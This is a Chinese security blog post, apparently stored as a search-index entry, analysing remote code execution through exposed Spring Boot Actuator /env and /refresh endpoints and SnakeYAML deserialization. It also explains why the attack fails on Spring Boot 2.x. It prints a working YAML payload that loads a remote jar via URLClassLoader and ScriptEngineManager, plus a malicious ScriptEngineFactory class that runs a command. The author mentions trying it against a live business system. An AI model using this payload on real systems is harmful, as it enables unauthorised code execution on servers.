<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SpringBoot Actuator SnakeYAML RCE漏洞分析</title>
    <url>/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近期公网监控过程中又发现存在actuator组件开放的情况，且env端点发现存在SnakeYAML依赖，由于业务重要性较低，为判断能否通过此问题进一步深入到内部，尝试借用SnakeYAML依赖获取服务端权限，失败了……</p>
<p>下面对actuator+SnakeYAML rce利用进行记录分析。</p>
<h1 id="SnakeYAML使用"><a href="#SnakeYAML使用" class="headerlink" title="SnakeYAML使用"></a>SnakeYAML使用</h1><p>是Java用于解析yaml格式数据的类库, 它提供了dump()将java对象转为yaml格式字符串，load()将yaml字符串转为java对象；</p>
<p>创建一个User类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>snakeyaml序列化、反序列化测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SnakeYamlTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 序列化测试</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">20</span>);</span><br><span class="line">        Yaml yaml1 = <span class="keyword">new</span> Yaml();</span><br><span class="line">        String dump1 = yaml1.dump(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;snakeyaml序列化测试：&quot;</span>);</span><br><span class="line">        System.out.println(dump1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化测试</span></span><br><span class="line">        String dump2 = <span class="string">&quot;!!com.ttestoo.snakeyaml.demo.User &#123;age: 30, name: admin&#125;&quot;</span>;</span><br><span class="line">        Yaml yaml2 = <span class="keyword">new</span> Yaml();</span><br><span class="line">        Object load = yaml2.load(dump2);</span><br><span class="line">        System.out.println(<span class="string">&quot;snakeyaml反序列化测试：&quot;</span>);</span><br><span class="line">        System.out.println(load.getClass());</span><br><span class="line">        System.out.println(load);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000125181.png" alt="image-20210820000125181"></p>
<h1 id="Actuator-env说明"><a href="#Actuator-env说明" class="headerlink" title="Actuator env说明"></a>Actuator env说明</h1><p>1、actuator组件的/env端点是否支持POST请求？</p>
<p>这个问题困扰了挺久，google搜了很多最终还是回到了官方文档，结论如下：</p>
<p>springboot的/env本身是只读的，是否能post是springcloud的扩展！！！项目作者在GitHub回复如下：</p>
<p><a href="https://github.com/spring-projects/spring-boot/issues/20509">https://github.com/spring-projects/spring-boot/issues/20509</a></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000402487.png" alt="image-20210820000402487"></p>
<p>而且翻了springboot多个1.x和2.x的官方文档，均未提及env端点能post请求改变环境变量：</p>
<p>官方文档地址如下，改版本号即可：</p>
<p><a href="https://docs.spring.io/spring-boot/docs/1.4.7.RELEASE/reference/htmlsingle/#production-ready-endpoints">https://docs.spring.io/spring-boot/docs/1.4.7.RELEASE/reference/htmlsingle/#production-ready-endpoints</a></p>
<p>所有版本文档：<a href="https://docs.spring.io/spring-boot/docs/">https://docs.spring.io/spring-boot/docs/</a></p>
<p>2.2.5版本 actuator api文档如下：</p>
<p>文档中仅说明可GET请求，并未提及可POST请求！！！</p>
<p><a href="https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/actuator-api//html/#env">https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/actuator-api//html/#env</a></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000602736.png" alt="image-20210820000602736"></p>
<p>根据github上springboot作者提示，继续翻springcloud官方文档，证明在springcloud的spring-cloud-context模块中对env进行了扩展，支持post请求：</p>
<p><a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints%EF%BC%88%E8%BF%99%E9%87%8C%E4%BB%A52.1.3%E7%89%88%E6%9C%AC%E4%B8%BA%E4%BE%8B%EF%BC%89">https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints（这里以2.1.3版本为例）</a></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000627174.png" alt="image-20210820000627174">    </p>
<p>2、那么实际利用过程中为啥有时post请求报错405呢？</p>
<p>继续查询springcloud项目文档，spring cloud所有版本文档：<a href="https://docs.spring.io/spring-cloud/docs/%EF%BC%9B">https://docs.spring.io/spring-cloud/docs/；</a></p>
<p>发现在Spring Cloud Hoxton Service Release 3 (SR3)的更新公告中，env端点默认不可写即post请求，可通过management.endpoint.env.post.enabled=true配置开启env端点的post请求：</p>
<p><a href="https://spring.io/blog/2020/03/05/spring-cloud-hoxton-service-release-3-sr3-is-available">https://spring.io/blog/2020/03/05/spring-cloud-hoxton-service-release-3-sr3-is-available</a></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000729126.png" alt="image-20210820000729126">    </p>
<p>继续查看Spring Cloud Hoxton Service Release 3 (SR3)的更新公告，可得知Hoxton.SR3基于Spring Boot 2.2.5.RELEASE构建：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000740760.png" alt="image-20210820000740760">    </p>
<p>在最下方可看到Hoxton.SR3版本对应的Spring Cloud Config组件版本为2.2.2.RELEASE：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000754259.png" alt="image-20210820000754259">    </p>
<p>那么为什么Spring Cloud Config组件和Spring Cloud context模块又有什么关系呢？</p>
<p>查看spring-cloud-config 2.2.2.RELEASE代码，其中pom.xml中包含spring-cloud-context 2.2.2.RELEASE依赖：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000814423.png" alt="image-20210820000814423">    </p>
<p>也就是说项目中引入了spring-cloud-starter-config 2.2.2.RELEASE也就包含了 spring-cloud-context 2.2.2.RELEASE，<strong>这就是为什么针对actuator rce利用环境中引入spring-cloud-starter-config组件或者指定spring-cloud-dependencies版本为Hoxton.SR1的原因！！！</strong></p>
<p>且这里已对spring-cloud-starter-config 2.2.1.RELEASE版本进行验证，Hoxton.SR3版本对应的spring-cloud-context也为2.2.2.RELEASE；</p>
<p>总结，在spring cloud Hoxton.SR3开始（基于Spring Boot 2.2.5.RELEASE构建，其中spring-cloud-context或者spring-cloud-starter-config为2.2.2.RELEASE版本），需要配置management.endpoint.env.post.enabled=true才可post访问env端点。</p>
<p>实际验证：</p>
<p>(1) 当引入spring-cloud-starter-config或spring-cloud-context 2.2.1.RELEASE时:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.1</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.1</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>不用手工单独配置management.endpoint.env.post.enabled=true即可进行post请求：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000940411.png" alt="image-20210820000940411"></p>
<p>(2) 当引入spring-cloud-starter-config或spring-cloud-context 2.2.2.RELEASE时：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>若未配置management.endpoint.env.post.enabled=true，则不支持post请求：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001100409.png" alt="image-20210820001100409"></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001105281.png" alt="image-20210820001105281"></p>
<p>当配置management.endpoint.env.post.enabled=true后，可支持post请求：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001124290.png" alt="image-20210820001124290"></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001135258.png" alt="image-20210820001135258"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="部分条件"><a href="#部分条件" class="headerlink" title="部分条件"></a>部分条件</h2><p>SpringBoot 1.x（spring-cloud-context copyEnvironment函数未更新前）</p>
<p>Actuator未授权且需springcloud扩展env endpoints post请求</p>
<p>org.yaml.snakeyaml组件</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p><a href="https://github.com/ttestoo/springboot-actuator-snakeyaml-rce">https://github.com/ttestoo/springboot-actuator-snakeyaml-rce</a></p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>1、vps起个http服务，上面放yml配置文件yaml-payload.yml和yaml-payload.jar文件：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820002721240.png" alt="image-20210820002721240"></p>
<p>yaml-payload.yml内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8087/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>yaml-payload.jar参考：<a href="https://github.com/artsploit/yaml-payload%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9%E5%9C%A8%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%AD%EF%BC%9A">https://github.com/artsploit/yaml-payload，主要内容在构造方法中：</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AwesomeScriptEngineFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、利用actuator的/env endpoint修改spring.cloud.bootstrap.location属性的值为vps上的yml配置文件的地址<a href="http://127.0.0.1:8087/yaml-payload.yaml%EF%BC%9A">http://127.0.0.1:8087/yaml-payload.yaml：</a></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820002846139.png" alt="image-20210820002846139"></p>
<p>通过actuator的/refresh接口刷新配置，则成功执行payload：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820002906060.png" alt="image-20210820002906060"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>springboot actuator组件未授权访问时，其/env端点经过spring cloud的扩展，可通过post请求设置env属性值，/refresh端点可以刷新配置；</p>
<p>当设置spring.cloud.bootstrap.location的值为外部的yaml文件地址时，通过refresh端点刷新时将会访问yaml文件地址并读取yaml文件内容：</p>
<ul>
<li>http请求/refresh接口，将进入到刷新配置的入口 org.springframework.cloud.endpoint.RefreshEndpoint#refresh：</li>
</ul>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003032508.png" alt="image-20210820003032508">    </p>
<ul>
<li>其中spring.cloud.bootstrap.location的值 将在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中进行处理：</li>
</ul>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003101650.png" alt="image-20210820003101650">    </p>
<ul>
<li>由于获取到spring.cloud.bootstrap.location的值为yaml后缀，将在org.springframework.boot.env.PropertySourcesLoader#load中调用到org.springframework.boot.env.YamlPropertySourceLoader#load进行加载yaml文件：</li>
</ul>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003122041.png" alt="image-20210820003122041">    </p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003133897.png" alt="image-20210820003133897">    </p>
<ul>
<li>最终在org.yaml.snakeyaml.Yaml#loadAll中进行读取yaml文件内容：</li>
</ul>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003144955.png" alt="image-20210820003144955">    </p>
<p>通过org.yaml.snakeyaml.Yaml#loadAll读取yaml文件内容，简单总结如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">Object url = yaml.load(<span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8087/yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;]&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>由于SnakeYAML支持!!+完整类名的方式指定要反序列化的类，并可以[arg1, arg2, ……] 的方式传递构造方法所需参数，则上述操作等价于执行如下内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://127.0.0.1:8087/yaml-payload.jar&quot;</span>);</span><br><span class="line">URLClassLoader urlClassLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"><span class="keyword">new</span> ScriptEngineManager(urlClassLoader);</span><br></pre></td></tr></table></figure>

<p>而URLClassLoader继承自SecureClassLoader（继承自ClassLoader），支持从jar包、文件系统目录和远程http服务器中动态获取class文件以加载类（ClassLoader只能加载classpath下面的类）；</p>
<p>这里则将访问<a href="http://127.0.0.1:8087/yaml-payload.jar%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87javax.script.ScriptEngineManager#ScriptEngineManager%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%EF%BC%9A">http://127.0.0.1:8087/yaml-payload.jar，并通过javax.script.ScriptEngineManager#ScriptEngineManager进行处理：</a></p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003248131.png" alt="image-20210820003248131"></p>
<p>下面就是ScriptEngineManager利用链的分析过程；</p>
<p>首先init()中调用initEngines()，使用SPI机制动态加载javax.script.ScriptEngineFactory的实现类，即通过getServiceLoader，去寻找yaml-payload.jar中META-INF/services目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载其中指定的类；</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003326541.png" alt="image-20210820003326541">    </p>
<p>为了满足Java SPI机制（是JDK内置的一种服务提供发现机制）的约定，在yaml-payload.jar中的恶意类实现了ScriptEngineFactory，META-INF/services/目录下存在一个名为javax.script.ScriptEngineFactory，文件内容为完整恶意类名：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003339881.png" alt="image-20210820003339881">    </p>
<p>Java SPI机制可参考：<a href="https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html">https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html</a></p>
<p>继续跟进，经过如下调用链：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003358201.png" alt="image-20210820003358201">    </p>
<p>最终在java.util.ServiceLoader.LazyIterator#nextService中利用Java反射机制获取yaml-payload.jar中的恶意类，并在newInstance时触发恶意类构造函数中的payload：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003411252.png" alt="image-20210820003411252">    </p>
<p> <img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003430551.png" alt="image-20210820003430551"></p>
<p>注意，这里forName的第二个参数initialize为false，有些博客描述为当true时则可触发恶意类构造函数中的payload；</p>
<p>其实，当forName第二个参数为true时仅会进行类初始化，从注释中也可看到：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003445952.png" alt="image-20210820003445952">    </p>
<p>而类的初始化并不会执行构造函数，但是会执行静态代码块，验证如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassForname</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        ClassLoader loader = TestClassForname.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n=========initialize为false测试==========&quot;</span>);</span><br><span class="line">        Class.forName(<span class="string">&quot;com.ttestoo.snakeyaml.payload.Test&quot;</span>, <span class="keyword">false</span>, loader);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n=========initialize为true测试==========&quot;</span>);</span><br><span class="line">        Class.forName(<span class="string">&quot;com.ttestoo.snakeyaml.payload.Test&quot;</span>, <span class="keyword">true</span>, loader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;静态代码块被调用。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;无参构造函数被调用。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003514115.png" alt="image-20210820003514115"></p>
<p>当然，恶意类中的payload也可以放在静态代码块中，由于这里为false依旧在newInstance()时触发：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h1 id="SpringBoot-2-x利用的问题"><a href="#SpringBoot-2-x利用的问题" class="headerlink" title="SpringBoot 2.x利用的问题"></a>SpringBoot 2.x利用的问题</h1><p>上述分析过程在springboot 1.x环境下，8月16号刚好遇到实际业务环境springboot 2.x存在actuator未授权访问问题，且存在snakeyaml组件：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003637126.png" alt="image-20210820003637126">    </p>
<p>利用过程中env endpoints post请求正常：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003647929.png" alt="image-20210820003647929">    </p>
<p>但是请求refresh后并无任何动静，且响应内容为空（1.x请求refresh端点会响应“document”）：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003700057.png" alt="image-20210820003700057">    </p>
<p>这就是知识点未学透的结果！！！对于此利用方式，2.x能否成功rce呢？</p>
<p>搭建2.x的测试环境（和业务环境一致），如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">springboot <span class="number">2.0</span><span class="number">.6</span>.RELEASE</span><br><span class="line">springcloud <span class="number">2.0</span><span class="number">.0</span>.RELEASE</span><br><span class="line">org.yaml.snakeyaml <span class="number">1.19</span></span><br><span class="line"></span><br><span class="line">注意<span class="number">2.</span>x需手工配置开启env、refresh endpoints，这里为方便直接*：</span><br><span class="line">management.endpoints.web.exposure.include=*</span><br></pre></td></tr></table></figure>

<p>在1.x利用分析过程中得知spring.cloud.bootstrap.location属性是在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取，这里直接在此处下断点：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003744991.png" alt="image-20210820003744991">    </p>
<p>开启debug，记得在请求refresh前通过env设置spring.cloud.bootstrap.location属性（否则可能为空，影响判断）：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003758057.png" alt="image-20210820003758057">    </p>
<p>接下来请求refresh端点，可清晰看到此时configLocation为空，即并未获取到上步设置的spring.cloud.bootstrap.location属性：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003808859.png" alt="image-20210820003808859">    </p>
<p>此时environment参数中无任何spring.cloud.bootstrap.location属性相关的信息：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003820284.png" alt="image-20210820003820284">    </p>
<p>回看1.x环境中的environment，发现在propertySources的propertySourceList中包含一个name为manager，value为env post请求设置的属性值：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003832112.png" alt="image-20210820003832112">    </p>
<p>可初步判断是在设置spring.cloud.bootstrap.location属性时出现了变更导致environment变量中无spring.cloud.bootstrap.location属性造成无法rce；</p>
<p>那么接下来就可以溯源environment变量如何生成的；根据执行到String configLocation = environment.resolvePlaceholders(“${spring.cloud.bootstrap.location:}”);的调用链，可得知environment在org.springframework.cloud.context.refresh.ContextRefresher#refresh中定义并通过org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数进行赋值：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003844193.png" alt="image-20210820003844193">    </p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003856384.png" alt="image-20210820003856384">    </p>
<p>对比spring-cloud-context 1.2.0和spring-cloud-context 2.0.0的copyEnvironment函数，其中1.x中将input（来自this.context.getEnvironment()，包含post env设置的spring.cloud.bootstrap.location属性）中propertySources的propertySourceList全部赋值给environment：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003908366.png" alt="image-20210820003908366">    </p>
<p>而在2.x中增加了一个for循环进行判断name是否在常量DEFAULT_PROPERTY_SOURCES中，只有在其中的才会执行capturedPropertySources.addLast操作：</p>
<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003920092.png" alt="image-20210820003920092">    </p>
<p>跟进常量DEFAULT_PROPERTY_SOURCES，为String数组：[“commandLineArgs”, “defaultProperties”]</p>
